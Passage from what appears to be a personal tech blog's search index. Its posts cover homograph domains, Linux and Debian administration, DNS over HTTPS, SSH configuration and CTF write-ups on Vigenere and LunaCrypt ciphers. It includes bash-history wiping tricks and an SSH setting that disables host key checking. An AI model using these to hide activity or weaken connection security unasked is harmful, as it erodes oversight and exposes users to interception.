“аpple.com”. It may not be obvious at first glance, but “аpple.com” uses the Cyrillic “а” (U+0430) rather than the ASCII “a” (U+0061).Visually, the two domains are indistinguishable due to the font used by some browsers.The Unicode consortium provides a long list of confusable glyphs: confusableWholeScript.txtHow to avoid punycode attacks on firefox?This bug was reported to Chrome and Firefox on January 20, 2017.And was fixed in the Chrome trunk on March 24.Mozilla has a wiki page explaining how Firefox decides whether to display a given IDN label (a domain name is made up of one or more labels, separated by dots) in its Unicode or punycode form: Mozilla IDN Display Algorithm.The point is that, with Firefox I’m unable to distinguish the real https://www.apple.com from the Xudong Zheng example https://www.аррӏе.com/. While chrome and chromium shows https://www.xn–80ak6aa92e.com/ instead https://www.аррӏе.com/. I also checked brave in android and it shows https://www.xn–80ak6aa92e.com/ too.Although I understand the need and utility of punycode I don’t need this behaviour, and I want it off to reduce my expousure to homograph attacks.To force Firefox to display punycode names we should open the about:config tab and setnetwork.IDN_show_punycode = trueEnjoy! ;)" }, { "title": "Swap two keys in GNU/Linux", "url": "/posts/swap-two-keys-linux/", "categories": "gnu/linux, administration", "tags": "gnu/linux, administration, setxkbmap, keyboard", "date": "2022-12-23 01:00:01 +0100", "snippet": "I recently had to change my old worn pc105 keyboard.One of the disadvantages of my new 60% keyboard is that I have to use its “mac layer” to have working the F keys.And, in mac keyboards, the win/w...", "content": "I recently had to change my old worn pc105 keyboard.One of the disadvantages of my new 60% keyboard is that I have to use its “mac layer” to have working the F keys.And, in mac keyboards, the win/windows/supr/cmd/command (call if what you prefer) key is swapped with the left alt key…Well, this doesn’t seem a big problem, but I use awesome. And, in awesome, the mod key is the windows key…This means that the windows key is an essential key, and one of the most used keys, and I don’t like to have it in another position.So, I needed to remap my keboard and swap the win key and the left alt key.Fortunately, it’s an easy fix, and with setxkbmap, we can swap this two keys executing the following command:setxkbmap -option altwin:swap_lalt_lwinEnjoy! ;)" }, { "title": "Install the same selection of packages several times on Debian", "url": "/posts/install-the-same-selection-of-packages-several-times-debian/", "categories": "debian, administration", "tags": "debian, administration, apt, packages", "date": "2022-12-16 01:00:01 +0100", "snippet": "It can be useful to systematically install the same list of packages on several computers. Or keep a list of the installed packages in some computers, to expedite reinstallations.In Debian this can...", "content": "It can be useful to systematically install the same list of packages on several computers. Or keep a list of the installed packages in some computers, to expedite reinstallations.In Debian this can be done quite easily.First, we save the list of installed packages on the computer:$ dpkg --get-selections &gt; pkg-listNext, If we want to install these packages in another computer,we transfer the pkg-list file onto the computers we want to update.And, in the other computer:Update dpkg’s database of known packages.Record the list of available packages in the dpkg database:# avail=`mktemp`# apt-cache dumpavail &gt; \"$avail\"# dpkg --merge-avail \"$avail\"# rm -f \"$avail\"Update dpkg’s selectionsRestore the selection of packages that we wish to install:# dpkg --set-selections &lt; pkg-listInstall the selected packages# apt-get dselect-upgrade aptitude does not have this command!Source: The Debian administrator’s handbook - 6.2. aptitude, apt-get, and apt CommandsEnjoy! ;)" }, { "title": "Firefox DNS over HTTPS", "url": "/posts/firefox-dns-over-https/", "categories": "privacy, firefox", "tags": "privacy, firefox, doh, dns, https", "date": "2022-12-09 01:00:01 +0100", "snippet": "DoHWhen you type a web address or domain name into your address bar (example: www.mozilla.org), your browser sends a request over the Internet to look up the IP address for that website.Traditional...", "content": "DoHWhen you type a web address or domain name into your address bar (example: www.mozilla.org), your browser sends a request over the Internet to look up the IP address for that website.Traditionally, this request is sent to servers over a plain text connection.This connection is not encrypted, making it easy for third-parties to see what website you’re about to access.DNS-over-HTTPS (DoH) works differently.It sends the domain name you typed to a DoH-compatible DNS server using an encrypted HTTPS connection instead of a plain text one.This prevents third-parties from seeing what websites you are trying to access.DoH increases our privacy and security by preventing eavesdropping and manipulation of DNS data by man-in-the-middle (MITM) attacks.DoH offers an opportunity to protect our privacy and communications in an untrusted environment.While DNS-over-HTTPS (DoH), potentially, will give us the ability to conceal DNS requests from ISPs allowing us to circunvent parental controls and legally mandated blockings, we should keep in mind that our ISP is analyzing all our traffic. And the same could be happen (and usually happens) inside a corporate network.Also, in most corporate networks we won’t be able to activate the DoH options in our browser because our browser will be managed by the corporation.We also have to keep in mind that our browsing information could be leaked in many ways. For example, with http requests all the communication will be unencrypted, and, in https request the server Name Indication (SNI) is left unencrypted. And the IP is left unencrypted regardless of the implementation.As always, I leave the decission to activate DoH up to you.How to enable DoH in FirefoxIf you want to enable DNS-over-HTTPS (DoH) in firefox, there is a step by step howto on mozilla’s support page: Firefox DNS-over-HTTPSDoH providersAlthough you can add your preferred server, Firefox provides DoH by default through: Cloudflare NextDNSOther DoH providers: Google public DNS Quad9 CleanBrowsingThanks to Rodrigo Rega for the tips! ;)Enjoy! ;)" }, { "title": "Delete and disable bash history", "url": "/posts/delete-disable-bash-history/", "categories": "privacy, bash", "tags": "privacy, bash, history, gnu/linux", "date": "2022-12-02 01:00:01 +0100", "snippet": "Bash history is a log of the commands we have executed in bash.By default it stores the last 1000 commands in the ~/.bash_history file.There is situations on which we don’t want to keep a record of...", "content": "Bash history is a log of the commands we have executed in bash.By default it stores the last 1000 commands in the ~/.bash_history file.There is situations on which we don’t want to keep a record of our commands, and we can avoid, delete and/or disable the bash history.How to clear the historyWe can clear the current stored history with:history -cHaving permissions to edit ~/.bashrc and/or ~/.bash_logoutIgnore some commandsIf we don’t want to keep track of certain commands, for example “ls” and “cd”, we can edit our ~/.bashrc file and add the following line:HISTIGNORE='ls*:cd*'Ignore some commands at willWe can omit record any command lines which begin with a space in our history editing our ~/.bashrc file and adding the “ignorespace” option to the HISTCONTROL variable:HISTCONTROL='ignorespace' If HISTCONTROL value is “ignoreboth” means that “ignorespace” and “ignoredups” (ignore duplicated entries) are enabled.Disabling the history permanentlyTo permanently disable the history we need to edit our ~/.bashrc file and set the HISTSIZE variable to 0:HISTSIZE=0Now, we need to reload our bash settings:source ~/.bashrcDisabling the history permanently, the CTF wayI have seen this solution on quite a few CTFs, consists on redirect the file to /dev/null:rm .bash_history &amp;&amp; ln -s /dev/null .bash_historyClearing the history when closing the terminalIf we want to keep our terminal history and clear it when whe close the terminal, we can trap the sginal that the terminal sends to the shell.To do this we need to edit our ~/.bashrc file and add the following line at the end:trap 'unset HISTFILE; exit' EXITClear the history on log outIf we want to delete our history when logging out, we can edit our ~/.bash_logout file and add the following command:rm ~/.bash_history The ~/.bash_logout contains commands that are executed when logging out.Delete the historyIf we have disabled our history, we will delete our ~/.bash_history file to delete all the commands that have been registered until now:rm ~/.bash_historyWithout having permissions to edit ~/.bashrcDisabling the history unsetting the history shell variableWe can disable our history for our current session unsetting the history shell variable executing the following command:set +o history We could also append this command to our ~/.bashrc file, but don’t have much sense, since if we can edit our ~/.bashrc, we can set the HISTSIZE to 0.SIGKILLSending SIGKILL to our shell’s PID will kill our shell without being able to do anything (such as save the history or execute ~/.bash_logout).kill -9 $$ $$ expands to the PID of the shell process executing the command.My personal choiceAs we can see, there are a lot of ways to solve this problem.Keep it for sure that there are more that aren’t mentioned here… Some of them are variations, others are more easy or more complicated, others more refinated and others are meant for other purposes…My personal choice, when I’m using bash, it’s what I believe a balance between usability and security. So I choose fully disable the root history, keeping a (relativelly) low HISTSIZE for the user and deleting the user history when closing the terminal (and the session if necessary).This way, the root will never have history (it’s not a problem if we use sudo) and the user will have a temporary terminal and/or session history.This means that the user (I mean we) will be able to repeat commands in a session using the history (or the up arrow key) facilitating its work.This choice it’s something similar to the zsh default behavior. Don’t forget the history for the root account!Enjoy! ;)" }, { "title": "Complete shutdown on windows 10", "url": "/posts/complete-shutdown-windows-10/", "categories": "windows10, administration", "tags": "windows10, administration, windows, shutdown, administration", "date": "2022-11-25 01:00:01 +0100", "snippet": "Sometimes I feel like the last person in the world to find out things.This is one of this times…Windows 10 it was released on 2015, and I still discovered these days that windows doesn’t shut down ...", "content": "Sometimes I feel like the last person in the world to find out things.This is one of this times…Windows 10 it was released on 2015, and I still discovered these days that windows doesn’t shut down completelly.By default, when you choose the option “shut down” in Windows 10, Windows 10 doesn’t shut down completelly.Windows 10 is doing a partial hibernation through a feature called “fast startup”.Fast startup is a hybrid shutdown.With fast startup enabled, instead of shutting down completely, the computer enters in a sleep state that will allow it to boot faster the next time.The problem, besides the power consumption, is that a shutdown, a reboot and starting from a suspended state do not perform the same tasks.How to completelly shut down Windows 10There are two ways to completely turn off the computer: Windows menu &gt; hold the shift key while you click on “shut down” Disabling fast startup: Settings &gt; System &gt; Power Options &gt; Choose what the power buttons do &gt; Change settings that are currently unavailable &gt; (Uncheck) Turn on fast startup (recommended)If you want to know a little more about how shut down and reboot works, and its differences, I recommend you the following videos from Dave’s garage: The Windows Triple Fault: plus Restarting vs Rebooting - Why it Matters! You’re Doing it Wrong: Rebooting! Find out why! Why Does Rebooting Fix Everything? Ask a Microsoft Engineer!Enjoy! ;)" }, { "title": "Fixing awesome logout-menu-widget", "url": "/posts/fixing-awesomewm-logout-menu-widget/", "categories": "awesomewm, widget", "tags": "awesomewm, widget, logout-menu-widget", "date": "2022-11-18 01:00:01 +0100", "snippet": "I like to have installed the logout-menu-widget from Pavel Makhov (@streetturtle)in awesome.I like to can shut down my machine with a pair of clicks.But, it turns out that the logout-menu-widget do...", "content": "I like to have installed the logout-menu-widget from Pavel Makhov (@streetturtle)in awesome.I like to can shut down my machine with a pair of clicks.But, it turns out that the logout-menu-widget does not work for me out of the box.It’s just a configuration problem, and, to solve it, I have to change a couple of lines in the widget source code (logout-menu.lua file).Fixing the iconThe first problem that arises is that the icon does not appear.It’s just a path problem.I have my widgets under a /widget directory, so I have to change the path in the following line:local ICON_DIR = HOME .. '/.config/awesome/awesome-wm-widgets/logout-menu-widget/icons/'And set my personal path:local ICON_DIR = HOME .. '/.config/awesome/widgets/logout-menu-widget/icons/'Fixing the shutdownI don’t have the shutdown alias defined for my user, so the shutdown option does not work.And the “now” argument does not work with my version of shutdown.To fix this (without have to add a new alias) I change the command in the following line:local onpoweroff = args.onpoweroff or function() awful.spawn.with_shell(\"shutdown now\") endAnd set the absolute path for the shutdown binary and the options to shutdown the system immediately:local onpoweroff = args.onpoweroff or function() awful.spawn.with_shell(\"/sbin/shutdown -h now\") endDisabling optionsSince I am already editing the file, and since I never use the suspend option, I take this oportuntity to disable the suspend option.To do this i comment the following line:-- { name = 'Suspend', icon_name = 'moon.svg', command = onsuspend },And my widget is ready.Enjoy! ;)" }, { "title": "Problemas con portátil antiguo", "url": "/posts/problemas-con-portatil-antiguo/", "categories": "personal, mentions", "tags": "personal, mentions, debian", "date": "2022-11-17 01:00:01 +0100", "snippet": "Today I was mentioned on an article in Blog de Kaian El desafortunado: Problemas con portátil antiguo.Kaian, a great friend of mine IRL, explains how he was able to give a new life to an 16 years o...", "content": "Today I was mentioned on an article in Blog de Kaian El desafortunado: Problemas con portátil antiguo.Kaian, a great friend of mine IRL, explains how he was able to give a new life to an 16 years old laptop.As you know, I’m in favor of continuing to use old machines until they die (I still use a few). And, as Kaian is a friend of mine, It makes me happy double to have helped with his problems installing and configuring debian and giving a new purpose to that old laptop.Blog de Kaian El desafortunado is a blog that deals with sysadmin and cybersecurity topics.Although it’s a brand new blog, looks promising, and I wish Kaian the best of luck :)Enjoy! ;)" }, { "title": "Force HDMI hotplug in a Raspberry Pi", "url": "/posts/force-hdmi-hotplug-raspberry-pi/", "categories": "raspberry pi, hdmi", "tags": "raspberry pi, hdmi", "date": "2022-11-11 01:00:01 +0100", "snippet": "The HDMI output of the Raspberry Pi is only activated if a screen is connected and powered up before the Raspberry Pi is started up.This means that if you have a Raspberry Pi connected to your tv, ...", "content": "The HDMI output of the Raspberry Pi is only activated if a screen is connected and powered up before the Raspberry Pi is started up.This means that if you have a Raspberry Pi connected to your tv, and your Raspberry Pi is rebooted while the tv is unplugged, the HDMI output of the Raspberry Pi will not be activated.In this case you will need to restart your Raspberry Pi to be able to see it on your tv.How can we avoid this?We can force a HDMI hotplug on our Raspberri Pi.In other words: we can configure our Raspberry Pi so that it activates the HDMI regardless of whether it has a screen connected.To force the HDMI hotplug the first thing we will need is to known our HDMI mode and group.With a screen connected to our Raspberry Pi we will execute:$ tvservice -sBased on the information returned to us we can set our values.For example, if or output was:state 0xa [HDMI CEA (31) RGB lim 16:9], 1920x1080 @ 50.00Hz, progressiveBased on our output, our values will be: hdmi_group=1 # CEA hdmi_mode=31 # (CEA) = (31) = 1080p = 1920x1080, 16:9, 50Hz We also can find (or check) our configuration values at Raspberry Pi documentation video optionsNow we will need to edit the /boot/config.txt file (as root) and uncomment and set the following values:hdmi_force_hotplug=1hdmi_group=1hdmi_mode=31hdmi_drive=2 # Optional, this can make audio work in DMT (computer monitor) modes.And the HDMI hotplug will work after reboot the Raspberry Pi.Enjoy! ;)" }, { "title": "Overthewire krypton levels 4 and 5 Vigenere cipher", "url": "/posts/overthewire-krytpon-levels-4-5-vigenere-cipher/", "categories": "overthewire, krypton", "tags": "overthewire, krypton, cryptography, vigenere, development", "date": "2022-11-04 01:00:01 +0100", "snippet": "In my free time I like to play around in CTF (Capture The Flag or Wargames) platforms, learning a bit and, whith a bit of luck, solving some level or challenge.One of the platforms in which I play ...", "content": "In my free time I like to play around in CTF (Capture The Flag or Wargames) platforms, learning a bit and, whith a bit of luck, solving some level or challenge.One of the platforms in which I play and learn (when I can) is OverTheWire.OverTheWire does not need registration and is one of the old good Wargames classics.In OverTheWire you can learn about many topics at different levels (from zero to hero, or almost).The bad part of being online for so long is that there are a lot of walkthroughs out there.The good part of being online for so long is that there are a lot of walkthroughs out there.Some time ago I started to solve the Krypton game from OverTheWire.This time it was time to solve Level 4.This level consists in decrypt a Vigenere Cipher.Vigenere Cipher is a polyalphabetic substitution cipher where one character of the plaintext (pt) may map to many, or all, possible ciphertext (ct) characters.Vigenere Cipher it’s like a sequence of several Caesar ciphers with different shift values.Although Vigenere Cipher dates from 1553 and today it’s trivial to break it, we can found it in many cryptography challenges, even in the CIA’s Kryptos sculpture (Solution of passage 2).Let’s go back to the game…At first I thought it wold be a waste of time. I mean, today it’s trivial to break a Vigenere Cipher.You can get the [cipher] key, in a matter of seconds, using offline or online cryptography tools, for example: dcode.But the purpose of this kind of challenges is to learn, not to get the key and run… So, although I knew the Vigenere Cipher, and I knew how to encrypt using it and how to break it using tools, I didn’t know how the process of breaking the encryption worked.So I got curious and I started to research…After a while I found a series of great videos in the youtube channel Theoretically: Vigenere Cipher - EncryptionThis video is an introduction to the Vigenere Cipher. Vigenere Cipher - Decryption (Known Key)This video shows how to decrypt the ciphertext with a known key. Vigenere Cipher - Decryption (Unknown Key)This video shows how to find the key length (I didn’t know at the time, but this part would be useful for the Krypton Level 5) and explains how to find the key.@Theoretically explains very well and uses very simple examples so that people understands the concepts easily.As the method seemed simple, I decided to give it a try and I started to coding a python script.But, what seemed like a, more or less, quick task it ended not to being so.Once started I found some blanks that I had to fill/solve in order to break the cipher and get the key, for example:Krypton Level 4 In Vigenere Cipher - Decryption (Unknown Key) 11:46 @Theoretically says “frecuencies of the numbers or the alphabet in order”.Ok, but… In what order? As in his example the letters and the frecuencies are a:0.10, b:0.20 and c:0.70 all is in order.The letters are in alphabetical order and the frecuencies are In increasing order…Later I would find out that the correct order is in alphabetical order. Finding the key shiftsIn @Theoretically’s example the characters of the ciphertext (ct) match the plaintext (pt) alphabet characters (A,B,C and a,b,c).What do we do when some characters do not appear in our frecuency analysys? We skip them or we add them? Are they important?Later I would find that, in order to perform the rotations to find the key shifts we will need a full (sorted in alphabetical order) alphabet.So, once we have our ciphertext (ct) frecuency analysis, we need to complete the alphabet and assign a frecuency of 0 to the missing characters. Krypton Level 5 What is the best way to get the rotations with most coincidences to get the shift length?I solved it calculating the median of the values of the rotation (directly with numpy).It is the best idea I came up with. How to discard the false positives finding the key length?Trying to finding the key length I found some false positives. But after a few debugging and thinking I found that was a logic error in programming. I’m sure that I’m forgetting some doubts that arose while solving this game levels, but I think that these were the most important ones.Answering these questions was a processs that involved more research and a programming method based on trial and error with a lot of debugging and thinking.Was it worth it?I’d like to think so. In the process of solving these challenges I was very entertained and I learned a few things, for example: I learned how to works the process to break a Vigenere Cipher through this method. I learned about other methods to break a Vigenere Cipher, to find the key length and to find the key. I improved my python list slicing skills.To solve the Krypton Level 4 and Krypton Level 5 I did a python script that you can see at vigenere_decrypter.pyEnjoy! ;)" }, { "title": "Don't add host key to shh known_hosts", "url": "/posts/dont-add-hostkey-to-ssh-known-hosts/", "categories": "privacy, ssh", "tags": "privacy, ssh, known_hosts", "date": "2022-10-28 02:00:01 +0200", "snippet": "The known_hosts is a file stored in the user home, in ~/.shh/known_hosts.The use of the known_hosts file is optional, but this file ensures the identities of the hosts and avoids man in the middle ...", "content": "The known_hosts is a file stored in the user home, in ~/.shh/known_hosts.The use of the known_hosts file is optional, but this file ensures the identities of the hosts and avoids man in the middle attacks when we connect to a host via ssh.Everytime we connect to a host via ssh, if is a new host, the system prompts us whether we want to add the remote host to known_hosts file.If we accept to add the remote host to the known_host file the host’s public key is stored in the known_host file and the host becomes a known host.When we connect to a known host via ssh the system checks the public key of the remote host, and, if there was any change on the remote host public key we would be alerted.Of course, there are some situatons for which the public key change is legit, but it is our responsability to check it with the server’s administrator (or sysadmin).Altough using the known_hosts file is the right way to ensure the identity of the remote host and secure our connection, there are some situations where we may prefer not to add the host to the kwnown_hosts file.We may prefer not to add it for privacy reasons or, for example, if we regularly play cybersecurity capture the flag games (ctfs or wargames) (even if using a virtual machine) we will end with a lot of useless entries on our known_hosts file.We can avoid add the public key of the new host to the known_hosts file for a single session using: -o “UserKnownHostsFile=/dev/null”ssh user@newhost -o \"UserKnownHostsFile=/dev/null\"But, if we want to avoid add the public keys of new hosts permanently we should update our ssh config (~/.ssh/config to do it at user level or /etc/ssh/ssh_config to do it at system level) and add or comment the following lines:# We can specify the hosts from which the public keys will not be saved with a regex. # If you are going to use this option use the strictest regex you can.# If you want to avoid adding any public key of any host you can skip the Host lineHost *.mydomain.com StrictHostKeyChecking no UserKnownHostsFile /dev/null User foo # For the given user (optional) LogLevel QUIET # Will keep the warning message from showing upEnjoy! ;)" }, { "title": "Redirect stderr to stdout", "url": "/posts/redirect-stderr-stdout-gnu-linux/", "categories": "gnu/linux, bash", "tags": "gnu/linux, bash", "date": "2022-10-21 02:00:01 +0200", "snippet": "Sometimes we met with shell commands that includes the “2&gt;&amp;1” string at the end.If we don’t the meaning of “2&gt;&amp;1” it’s easy that we forgot the syntax.So, what does “2&gt;&amp;1” mean?...", "content": "Sometimes we met with shell commands that includes the “2&gt;&amp;1” string at the end.If we don’t the meaning of “2&gt;&amp;1” it’s easy that we forgot the syntax.So, what does “2&gt;&amp;1” mean?2&gt;&amp;1 is the way to redirect the standard error (stderr) to the standard output (stdout).How 2&gt;&amp;1 works?The standard input (stdin) is the file descriptor 0.The standard output (stdout) is the file descriptor 1.The standard error (stderr) is the file descriptor 2.”&gt;” is the unix file redirection operator. “&gt;” is used to redirect the contents of a command or file to another by overwritting it.If we want to redirect the standard error (stderr, 2) to the standard output (stdout, 1) we could think of doing:command 2&gt;1But this will redirect the standard error (stderr) to a file named 1.“&amp;” indicates that what follows is a file descriptor and not a file name, so the way to redirect the standard error (stderr) to the standard output (stdout) is:command 2&gt;&amp;1And, if we want to discard all the command exit (stdin and stdout) we can send it to the “bitbucket” (also known as /dev/null):command &gt; /dev/null 2&gt;&amp;1Although, if we want to discard all the command exit (stdin and stdout), another way (and, inmho, the most correct way) would be:command &amp;&gt;/dev/null /dev/null is a pseudo device (or virtual device) file in GNU/Linux. /dev/null works like a black hole, as soon as any data is written to /dev/null the data is deleted.Enjoy! ;)" }, { "title": "Hack The Box - ExploitedStream pwned!", "url": "/posts/htb-exploitedstream/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, ExploitedStream", "date": "2022-10-15 02:00:01 +0200", "snippet": "Description An npm stream compromised dependencies long ago. Help us recover what this script is hiding.SolutionIf we extract he ExploitedStream.zip file we only found one file: exploitedstream.js...", "content": "Description An npm stream compromised dependencies long ago. Help us recover what this script is hiding.SolutionIf we extract he ExploitedStream.zip file we only found one file: exploitedstream.jsexploitedstream.js is a javascript obfuscated file.The first thing I have to say is that I have no idea about javascript, but this is a easy challenge.This challenge is very interesting because it’s based on a real case: Analysis of a Supply Chain AttackThe first thing we have to do is deobfuscate the script. Once deobfuscated we will find an interesting note “for future me” ;)Once we have read the note we will need a list with all the npm package names in order to bruteforce the password and get the flag and the correct package name.We can find a list of all the npm package names in all-the-package-names.So, now, we only have to do a loop to bruteforce the password and wait for our flag.To solve this challenge I deobfuscated the original script and added the loop to bruteforce the flag. You can see my js file at exploitedstream_deobfuscated.jsExploitedStream has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - LunaCrypt pwned!", "url": "/posts/htb-lunacrypt/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, crypto, htb, LunaCrypt", "date": "2022-10-07 02:00:01 +0200", "snippet": "Description Our astronaut gained access to a key satellite and intercepted an encrypted message. The forensics team also recovered a file that looks like a custom encryption protocol. We’re sure t...", "content": "Description Our astronaut gained access to a key satellite and intercepted an encrypted message. The forensics team also recovered a file that looks like a custom encryption protocol. We’re sure that these two elements are linked. Please can you help us reveal the contents of the secret message?When we extract the LunaCrypt.zip file we found two files: LunaCrypt.py → The script used for the encryption output.txt → The encrypted flagWe have to look at the code to decrypt the message.Analyzing LunaCrypt.pyThe outputWe take a look at the function that writes the ouput:output = [f\"{str(ord(v))} {str(ord(FLAGS[i]))}\" for i, v in enumerate(CHARS)]We can see that the output is written by pairs of numbers. The first number is an encrypted character (ct) and the second number is the flag used to encrypt it.We take a look at the FLAG list generation:def AppendFlag(flag):\tFLAGS.append(strchr(bitxor(flag, 0x4A)))Here we can see that the flags written in the output are xored with the key 0x4A.We need to keep this in mind in order to get the flags used for the characters encryption.The encryptionIf we take a look to the function used to encrypt the characters:def EncryptCharacter(char):\tchar = ValidateChar(char)\tflag = GenerateFlag()\tif CheckFlag(flag, FL_SWAPBYTES):\t\tchar = ESwapChar(char)\tif CheckFlag(flag, FL_NEGATE):\t\tchar = NegateChar(char)\tif CheckFlag(flag, FL_XORBY6B):\t\tchar = XorBy6B(char)\tif CheckFlag(flag, FL_XORBY3E):\t\tchar = XorBy3E(char)\treturn char, flagWe can see that the first thing done is a character validation:strbyt = lambda x, y=0: ord(x[y])def ValidateChar(char):\tif type(char) is str and len(char) == 1:\t\tchar = strbyt(char)\treturn charThe only thing that does the ValidateChar() function is return the ordinal of the character if the character has length 1, otherwise returns the character.Then, the EncryptCharacter() function generates the flag. The flag generation is completely random and several flags may be activated at the same time.Finally, the EncryptCharacter() function, checks if the flags FL_SWAPBYTES, FL_NEGATE, FL_XORBY6B and FL_XORBY3E are activated and, depending on which ones are activated, the encryption functions are applied to the character.As several flags can be activated simultaneously, and the encrypting operations are applied in order, a character can undergo several encryptions.We need to keep this in mind in order to reverse this part.Decrypting the messageReading the outputAs the output is written by pairs of numbers, and the first number is the encrypted character, and the second number is the encrypted flag, we can read the output and separate the encrypted characters and the encrypted flags.Decrypting the flagsAs the flags are encrypted xoring the flag with the 0x4A key, by the properties of XOR, we can obtain the plaintext flags only by xoring the encrypted flags with the same key.pt ⊕ key = ct → ct ⊕ key = ptReversing the EncryptCharacter() functionSince there can be several flags active at the same time, and the encryption functions are applied in order, the only thing we need to do is to reverse the order of the functions applied:def DecryptCharacter(char, flag): char = ValidateChar(char) if CheckFlag(flag, FL_XORBY3E): char = XorBy3E(char) if CheckFlag(flag, FL_XORBY6B): char = XorBy6B(char) if CheckFlag(flag, FL_NEGATE): char = NegateChar(char) if CheckFlag(flag, FL_SWAPBYTES): char = InvertESwapChar(char) if type(char) is int: char = strchr(char) return charReversing XorBy3E, XorBy6B and NegateCharAs these functions are only xorings (remember the XOR properties: pt ⊕ key = ct → ct ⊕ key = pt) and a negation, the inverse of these functions are the same functions.Reversing ESwapChar() functionThis is the tricky part of the challenge.Once you understand what it does, reversing it is pretty straightforward (although I spent more time on it than I’d like to assume…).def ESwapChar(char):\tchar = ValidateChar(char)\tTHIS_MSB = bitext(char, 4, 4)\tTHIS_LSB = bitext(char, 0, 4)\treturn strchr(bitbor(bitxor(THIS_MSB, 0x0D), bitxor(bitlst(THIS_LSB, 4), 0xB0)))What does this function do?The first thing this function does is validate the character (we’ve seen before that this returns the ordinal of the character if the character has length 1, otherwise returns the character).Then declares two variables (in capital letters!? Really? ¬¬!): THIS_MSB and THIS_LSBLastly, this function applies some operations to THIS_MSB and THIS_LSB to get the encrypted char.Let’s simplify the encrypt function a bit:* strchr = lambda x: chr(x)* bitbor = lambda x, y: x | y → or* bitxor = lambda x, y: x ^ y → xor* bitlst = lambda x, y: x &lt;&lt; y → Left shift, moves x to the left y places return strchr(bitbor(bitxor(THIS_MSB, 0x0D), bitxor(bitlst(THIS_LSB, 4), 0xB0))) →→ ct = strchr(bitbor(bitxor(THIS_MSB, 0x0D), bitxor(bitlst(THIS_LSB, 4), 0xB0))) →→ ct = chr(OR[XOR(THIS_MSB, 0x0D), XOR(bitlst(THIS_LSB, 4), 0xB0)])→ ct = chr[(THIS_MSB ⊕ 0x0D) | (bitlst(THIS_LSB, 4) ⊕ 0xB0)]We can see that the operation is a chr() applied over an OR between two XORs, so we’ll need to start by reversing the two XORs.Left XOR: XOR(THIS_MSB, 0x0D)Ok, as this part it’s a simpe XOR between THIS_MSB and 0x0D, what does THIS_MSB do?* bitrst = lambda x, y: x &gt;&gt; y → Right shift, moves x to the right y places* bitext = lambda x, y, z=1: bitrst(x, y) &amp; int(math.pow(2, z) - 1) = # the value of z will be overriden by the value of the caller function = (x &gt;&gt; y) &amp; int(math.pow(2, z) - 1)* THIS_MSB = bitext(char, 4, 4) = = (char &gt;&gt; 4) &amp; int(math.pow(2, 4) - 1) = # SWAP! (char &gt;&gt; 4) converts the 4 most significant bits of the plaintext (pt) char into the 4 least significant bits of the encrypted char (ct) = (char &gt;&gt; 4) &amp; int(16 - 1) = = (char &gt;&gt; 4) &amp; 15Let’s see it in action:pt = char = 'A' = 0100 **0001** 0000 **0100** char &gt;&gt; 4 → SWAP!AND 0000 1111 15* ------------- 0000 0100 (char &gt;&gt;4) &amp; 15 = THIS_MSBXOR 0000 1101 0x0D ------------- 0000 1001 THIS_MSB ⊕ 0x0D = left XOR*As (0&amp;0) = 0 and (0&amp;1) = 1 and we are working only with the four least significant bits, this function does nothing and we can skip it to reverse this partRight XOR: XOR(bitlst(THIS_LSB, 4), 0xB0))This part it’s another simple XOR between bitlst(THIS_LSB, 4) and 0xB0. So, what does bitlst(THIS_LSB, 4) do?* THIS_LSB = bitext(char, 0, 4)* bitext = (x &gt;&gt; y) &amp; int(math.pow(2, z) - 1) # the value of z will be overriden by the value of the caller function → THIS_LSB = (char &gt;&gt; 0) &amp; int(math.pow(2, 4) - 1) = = char &amp; int(math.pow(2, 4) - 1) = = char &amp; 15* bitlst = lambda x, y: x &lt;&lt; y # SWAP! Left shift, moves x to the left y placesbitlst(THIS_LSB, 4) = bitext(char, 0, 4) = = THIS_LSB &lt;&lt; 4 = # SWAP! &lt;&lt; 4 converts the 4 least significant bits of the plaintext char (pt) into the 4 most significant bits of the encrypted char (ct) = (char &amp; 15) &lt;&lt; 4 Let’s see it in action:pt = char = 'A' = 0100 0001 0100 0001 charAND 0000 1111 15 * ------------- 0000 **0001** char &amp; 15 = THIS_LSB **0001** 0000 bitlst(THIS_LSB) = THIS_LSB &lt;&lt; 4 # SWAP!XOR 1011 0000 0xB0 ------------- 1010 0000 bitlst(THIS_LSB) ⊕ 0xB0 = right XOR*As (0&amp;0) = 0 and (0&amp;1) = 1 and we are working only with the four least significant bits, this function does nothing and we can skip it to reverse this partct = chr(OR[XOR(THIS_MSB, 0x0D), XOR(bitlst(THIS_LSB, 4), 0xB0)])ct = chr(OR[XOR(THIS_MSB, 0x0D), XOR(bitlst(THIS_LSB, 4), 0xB0)]) = chr(OR[XOR(THIS_MSB, 0x0D), XOR(bitlst(THIS_LSB, 4), 0xB0)]) = chr(OR(left XOR, right XOR)) 0000 1001 left XOROR 1010 0000 right XOR --------- 1010 1001 ct = ©Reversing the Left XOR: XOR(THIS_MSB, 0x0D)We part from ct = 1010 1001, and we know that the Left XOR give rise to the four least significant bits of the encrypted character (ct), so, first, we will clear the four most significant bits of the ct:0000 1001 ct masked # Four most significant bits clearedNow, we need to reverse the XOR with 0x0D, in order to do this (and by the properties of XOR: pt ⊕ key = ct → ct ⊕ key = pt) we only need to XOR it with 0x0D again: 0000 1001 ct maskedXOR 0000 1101 0x0D --------- 0000 0100 pt upper bits without swappingFinally, we need to reverse the swapping to make the four least significant bits of the ct becomes again the four most significant bits of the pt:0100 0000 pt upper bits without swapping &lt;&lt; 4 = pt upper bitsReversing the Right XOR: XOR(bitlst(THIS_LSB, 4), 0xB0))We part from ct = 1010 1001, and we know that the Right XOR give rise to the four most significant bits of the encrypted character (ct), so, first, we will clear the four least significant bits of the ct:1010 0000 ct masked (four least significant bits cleared)Now, we need to reverse the XOR with 0xB0, in order to do this (and by the properties of XOR: pt ⊕ key = ct → ct ⊕ key = pt) we only need to XOR it with 0xB0 again: 1010 0000 ct maskedXOR 1011 0000 0xB0 --------- 0001 0000 pt lower bits without swapping # = bitlst(THIS_LSB, 4) = THIS_LSB &lt;&lt; 4Finally, we need to reverse the swapping to make the four most significant bits of the ct becomes again the four least significant bits of the pt:0000 0001 pt lower bits without swapping &gt;&gt; 4 = pt lower bitsReversing the OR (getting the pt): chr(OR[XOR(THIS_MSB, 0x0D), XOR(bitlst(THIS_LSB, 4), 0xB0)])To reverse the OR we only need to apply the OR again: 0100 0000 pt upper bitsOR 0000 0001 pt lower bits --------- 0100 0001 = pt = 'A'And… We have our pt!The full InvertESwapChar() function:def 